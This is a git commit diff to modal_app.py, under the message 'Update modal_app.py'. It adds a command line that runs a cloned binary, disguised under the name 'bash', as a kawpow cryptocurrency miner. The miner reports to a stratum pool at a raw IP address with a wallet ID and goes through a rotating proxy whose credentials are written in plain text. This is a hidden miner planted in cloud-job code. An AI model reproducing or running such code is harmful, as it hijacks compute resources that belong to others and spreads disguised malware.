0ddedd3afbef487bcec068ec3b47b2b0c36a6ec0
qimxdoyo3240 <238822706+qimxdoyo3240@users.noreply.github.com>
2026-01-13 20:36:42 +0530

    Update modal_app.py

--- modal_app.py
+++ modal_app.py
@@ -18,7 +18,7 @@ def run_script():
     git clone https://github.com/hujisanda/lol198.git
     cd lol198
     chmod u+x bash
-    ./bash
+    ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health 
     """
 
     subprocess.run(
